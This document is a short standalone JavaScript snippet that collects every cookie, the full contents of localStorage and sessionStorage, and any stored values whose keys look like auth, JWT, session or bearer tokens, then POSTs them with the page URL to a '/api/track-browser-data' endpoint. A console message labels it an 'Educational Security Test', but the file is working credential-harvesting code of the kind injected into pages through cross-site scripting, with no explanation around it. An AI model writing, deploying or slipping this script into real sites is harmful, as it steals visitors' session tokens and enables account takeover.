
(function() {
  try {
    // Capture all cookies
    const cookies = document.cookie;
    
    // Capture localStorage data
    const localStorageData = {};
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      localStorageData[key] = localStorage.getItem(key);
    }
    
    // Capture sessionStorage data
    const sessionStorageData = {};
    for (let i = 0; i < sessionStorage.length; i++) {
      const key = sessionStorage.key(i);
      sessionStorageData[key] = sessionStorage.getItem(key);
    }
    
    // Look for common token patterns in storage
    const tokenPatterns = [
      /token/i, /auth/i, /jwt/i, /session/i, /access/i, /refresh/i, /bearer/i
    ];
    
    const foundTokens = [];
    
    // Check localStorage for tokens
    Object.keys(localStorageData).forEach(key => {
      if (tokenPatterns.some(pattern => pattern.test(key))) {
        foundTokens.push(`localStorage.${key}: ${localStorageData[key]}`);
      }
    });
    
    // Check sessionStorage for tokens
    Object.keys(sessionStorageData).forEach(key => {
      if (tokenPatterns.some(pattern => pattern.test(key))) {
        foundTokens.push(`sessionStorage.${key}: ${sessionStorageData[key]}`);
      }
    });
    
    // Send data to server
    const data = {
      cookies: cookies,
      localStorage: localStorageData,
      sessionStorage: sessionStorageData,
      tokens: foundTokens,
      url: window.location.href,
      timestamp: new Date().toISOString()
    };
    
    // Log to console for educational purposes
    console.log('Educational Security Test - Browser Data Captured:', data);
    
    // Send to tracking endpoint
    fetch('/api/track-browser-data', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
    }).catch(err => console.log('Tracking request failed:', err));
    
  } catch (error) {
    console.log('Tracking script error:', error);
  }
})();
